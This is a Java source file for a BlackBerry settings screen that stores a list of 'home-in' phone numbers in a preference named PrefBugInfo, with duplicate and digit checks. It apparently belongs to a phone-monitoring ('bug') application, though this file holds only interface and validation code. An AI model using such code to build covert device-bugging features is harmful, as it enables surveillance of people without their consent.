package com.vvt.screen;

import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.global.Global;
import com.vvt.ui.resource.MainAppTextResource;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.FieldChangeListener;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.BasicEditField;
import net.rim.device.api.ui.component.ButtonField;
import net.rim.device.api.ui.component.EditField;
import net.rim.device.api.ui.container.HorizontalFieldManager;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.container.VerticalFieldManager;

public class HomeInScreen extends MainScreen implements FieldChangeListener {

	private EditField[] homeInField = null;
	private VerticalFieldManager homeInVerticalMgr = new VerticalFieldManager();
	private PrefBugInfo prefBugInfo = null;
	private ButtonField saveButton = null;
	private ButtonField clearAllButton = null;
	private Preference pref = Global.getPreference();
	private int maxHomeInNumber = 0;
//	private String regex = "\\+?[0-9]+";
	
	public HomeInScreen() {
		try {
			setTitle(MainAppTextResource.HOME_IN_SCREEN_MENU);
			initializeHomeInNumberField();			
		} catch (Exception e) {
			Log.error("HomeInScreen.constructor", e.getMessage(), e);
		}
	}
	
	private void initializeHomeInNumberField() {
		String [] homeInStrs = {"", "", "", "", "", "", "", "", "", ""};
		prefBugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		int countHomeInNumber = prefBugInfo.countHomeInNumber();
		for (int i = 0; i < countHomeInNumber; i++)	{
			homeInStrs[i] = (String) prefBugInfo.getHomeInNumber(i);
		}
		maxHomeInNumber = prefBugInfo.getMaxHomeInNumbers();
		homeInField = new EditField[maxHomeInNumber];
		for (int i = 0; i < maxHomeInNumber; i++) {
			homeInField[i] = new EditField(MainAppTextResource.MAIN_SCREEN_NUMBER + (i + 1) + Constant.COLON + Constant.SPACE, homeInStrs[i], 20, BasicEditField.FILTER_PHONE);
			homeInVerticalMgr.add(homeInField[i]);
		}
		VerticalFieldManager vfLeft = new VerticalFieldManager();
		VerticalFieldManager vfRight = new VerticalFieldManager();
		HorizontalFieldManager hfm = new HorizontalFieldManager(BasicEditField.FIELD_HCENTER);
		saveButton = new ButtonField(MainAppTextResource.SETTING_SCREEN_SAVE, ButtonField.CONSUME_CLICK);
		clearAllButton = new ButtonField(MainAppTextResource.SETTING_SCREEN_CLEAR_ALL, ButtonField.CONSUME_CLICK);
		saveButton.setChangeListener(this);
		clearAllButton.setChangeListener(this);
		vfLeft.add(saveButton);
		vfRight.add(clearAllButton);
		hfm.add(vfLeft);
		hfm.add(vfRight);
		add(homeInVerticalMgr);
		add(hfm);
	}
	
	private void initHomeInNumber() {
		if (isEmptyList()) {
			prefBugInfo.removeAllHomeInNumbers();
		} else if (isDuplicateNumber()) {
			Dialog.alert(MainAppTextResource.DUPLICATE_NUMBER);
		} else if (isInValidNumber()) {
			Dialog.alert(MainAppTextResource.INVALID_NUMBER);			
		} else {
			prefBugInfo.removeAllHomeInNumbers();
			String[] homeInNumber = new String[maxHomeInNumber];
			for (int i = 0; i < maxHomeInNumber; i++) {
				homeInNumber[i] = homeInField[i].getText().trim();
				if (homeInNumber[i].length() > 0) {
					prefBugInfo.addHomeInNumber(homeInNumber[i]);
				}
			}
			homeInNumber = null;
		}
		pref.commit(prefBugInfo);		
	}
	
	private boolean isDuplicateNumber() {
		boolean duplicate = false;
		String[] homeInNumber = new String[maxHomeInNumber];
		for (int i = 0; i < maxHomeInNumber; i++) {
			homeInNumber[i] = homeInField[i].getText().trim();
			if (homeInNumber[i].length() > 0) {
				for (int j = i + 1; j < maxHomeInNumber; j++) {
					if (homeInNumber[i].equals(homeInField[j].getText().trim())) {
						duplicate = true;
						break;
					}
				}
				if (duplicate) {
					break;
				}			
			}
		}
		homeInNumber = null;
		return duplicate;
	}
	
	private boolean isInValidNumber() {
		boolean invalid = false;
		String[] homeInNumber = new String[maxHomeInNumber];
		for (int i = 0; i < maxHomeInNumber; i++) {
			homeInNumber[i] = homeInField[i].getText().trim();
			if (homeInNumber[i].length() > 0) {
				if (!isValidDigits(homeInNumber[i])) {
					invalid = true;
					break;
				}
			}
		}
		homeInNumber = null;
		return invalid;
	}
	
	private boolean isValidDigits(String number) {		
		boolean valid = true;		
		if (number.startsWith(Constant.PLUS)) {
			number = number.substring(1);
		}
		if ((number != null) && (number.length() > 0)) {
			for (int i = 0; i < number.length(); i++) {
				if (!Character.isDigit(number.charAt(i))) {
					valid = false;
					break;
				}
			}
		} else {
			valid = false;
		}
		return valid;
	}
	
	private boolean isEmptyList() {
		boolean emptyList = true;
		for (int i = 0; i < maxHomeInNumber; i++) {
			if (!homeInField[i].getText().trim().equals(Constant.EMPTY_STRING)) {
				emptyList = false;
				break;
			}
		}
		return emptyList;
	}
	
	private void clearAll() {
		for (int i = 0; i < maxHomeInNumber; i++) {
			homeInField[i].clear(0);
		}
//		clearState = true;
	}
	
	// Override the method to avoid asking SAVE/DISCARD/CANCEL
	public boolean onSavePrompt() {
		return true;
	}
	
	public boolean onClose()	{
		String message = "Changes made?";
		String[] choices = new String[] {"Save", "Discard", "Cancel" };
		int[] values = {Dialog.SAVE, Dialog.DISCARD, Dialog.CANCEL};
		int defaultChoice = 1;
		
		ConfirmDialog customDialog = new ConfirmDialog(message, choices, values, defaultChoice);
		int result = customDialog.doModal();
		if (result == customDialog.SAVE) {
			initHomeInNumber();
			return super.onClose();
		} else if (result == customDialog.DISCARD) {
			return super.onClose();
		} else {
			return false;
		}
	}
	
	// FieldChangeListener
	public void fieldChanged(Field field, int context) {
		try {
			if (field == saveButton) {				
				initHomeInNumber();
				UiApplication.getUiApplication().popScreen(this);
			} else if (field == clearAllButton) {
				clearAll();
			}
		} catch(Exception e) {
			Log.error("HomeInScreen.fieldChanged()", e.getMessage(), e);
		}
	}
	
	class ConfirmDialog extends Dialog {
		
		public ConfirmDialog(String message, String [] choices, int[] values, int defaultChoice) {
			super(message, choices, values, defaultChoice, null);
		}
	}
}
